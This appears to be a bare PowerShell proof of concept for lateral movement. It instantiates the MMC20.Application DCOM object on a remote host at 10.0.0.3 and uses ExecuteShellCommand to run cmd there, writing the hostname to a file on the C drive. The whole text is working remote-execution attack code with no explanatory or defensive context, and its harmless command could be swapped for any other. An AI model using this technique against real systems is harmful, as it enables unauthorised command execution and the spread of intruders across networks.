$a = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.0.0.3"))
$a.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c hostname > c:\nss.txt","7")